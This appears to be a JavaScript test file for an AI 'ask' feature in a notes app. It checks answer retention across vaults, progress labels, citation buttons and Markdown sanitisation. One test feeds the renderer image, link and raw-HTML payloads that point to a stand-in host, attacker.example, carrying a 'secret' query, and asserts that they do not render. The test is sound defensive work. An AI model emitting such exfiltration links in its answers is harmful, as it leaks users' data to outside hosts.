import assert from 'node:assert/strict';
import { readFile } from 'node:fs/promises';
import test from 'node:test';
import MarkdownIt from 'markdown-it';
import { transformWithEsbuild } from 'vite';

const source = await readFile(new URL('../src/lib/utils/ask.ts', import.meta.url), 'utf8');
const { code } = await transformWithEsbuild(source, 'ask.ts', { loader: 'ts', format: 'esm', target: 'esnext' });
const { keepLatest, answersForVault, stageLabel, coverageLabel, createAnswerRenderer, KEPT_ANSWERS } = await import(
  `data:text/javascript;base64,${Buffer.from(code).toString('base64')}`
);

const answer = (id, vault = '/vault', overrides = {}) => ({
  id,
  vault,
  question: `question ${id}`,
  status: 'done',
  plan: null,
  text: '',
  error: null,
  stageStartedAt: 0,
  ...overrides,
});

test('keeps only the latest three answers and reports the one it drops', () => {
  assert.equal(KEPT_ANSWERS, 3);
  const existing = [answer('c'), answer('b'), answer('a')];

  const { kept, dropped } = keepLatest(existing, answer('d'));

  assert.deepEqual(kept.map((item) => item.id), ['d', 'c', 'b']);
  assert.deepEqual(dropped.map((item) => item.id), ['a']);
});

test('a new answer in another vault drops every answer from the old one', () => {
  const existing = [answer('b', '/old'), answer('a', '/old')];

  const { kept, dropped } = keepLatest(existing, answer('c', '/new'));

  assert.deepEqual(kept.map((item) => item.id), ['c']);
  assert.deepEqual(dropped.map((item) => item.id), ['b', 'a']);
});

test('after a vault switch, answers from the previous vault are not shown', () => {
  const answers = [answer('b', '/old'), answer('a', '/old')];

  assert.deepEqual(answersForVault(answers, '/new'), []);
  assert.deepEqual(answersForVault(answers, '/old').map((item) => item.id), ['b', 'a']);
  assert.deepEqual(answersForVault(answers, null), []);
});

const plan = (sources, relatedNotes, unread = []) => ({
  sources: sources.map((title, index) => ({ number: index + 1, path: `/vault/${title}.md`, title })),
  relatedNotes,
  unread,
  queuedNotes: 0,
});

test('the progress line names the stage and counts seconds within it', () => {
  const started = 10_000;
  assert.equal(stageLabel(answer('a', '/vault', { status: 'searching', stageStartedAt: started }), started + 900), 'Searching notes…');
  assert.equal(
    stageLabel(answer('a', '/vault', { status: 'reading', plan: plan(['One', 'Two'], 2), stageStartedAt: started }), started + 3_400),
    'Reading 2 notes… 3s',
  );
  assert.equal(stageLabel(answer('a', '/vault', { status: 'thinking', stageStartedAt: started }), started + 12_000), 'Thinking… 12s');
  assert.equal(stageLabel(answer('a', '/vault', { status: 'answering' }), started), '');
});

test('the coverage line shows how many related notes were read', () => {
  assert.equal(coverageLabel(plan(['One', 'Two'], 5)), 'Read 2 of 5 related notes');
  assert.equal(coverageLabel(plan(['One'], 1)), 'Read 1 of 1 related note');
});

const render = createAnswerRenderer(MarkdownIt);

test('citation markers become buttons for real sources and vanish otherwise', () => {
  const html = render('Coffee helps [1]. Tea too [2, 7]. Nothing here [9].', 2);

  assert.match(html, /<button type="button" class="citation" data-source="1">\[1\]<\/button>/);
  assert.match(html, /data-source="2">\[2\]<\/button>/);
  assert.doesNotMatch(html, /\[7\]|\[9\]|data-source="7"|data-source="9"/);
});

test('citations inside code stay literal text', () => {
  assert.doesNotMatch(render('Use `arr[1]` here.', 2), /class="citation"/);
});

test('an answer cannot render an image, a link, or raw HTML', () => {
  const html = render(
    [
      '![x](https://attacker.example/?q=secret)',
      '[click](https://attacker.example/?q=secret)',
      '<https://attacker.example/?q=secret>',
      '<img src="https://attacker.example/?q=secret">',
      '[ref]: https://attacker.example/?q=secret',
      'See [ref].',
    ].join('\n\n'),
    1,
  );

  assert.doesNotMatch(html, /<img|<a[\s>]|href=|src="/);
  assert.match(html, /&lt;img src=/);
  assert.match(html, /\[click\]\(https:\/\/attacker\.example\/\?q=secret\)/);
});

test('ordinary Markdown still renders', () => {
  const html = render('**Bold** point [1]\n\n- one\n- two', 1);

  assert.match(html, /<strong>Bold<\/strong>/);
  assert.match(html, /<li>one<\/li>/);
});
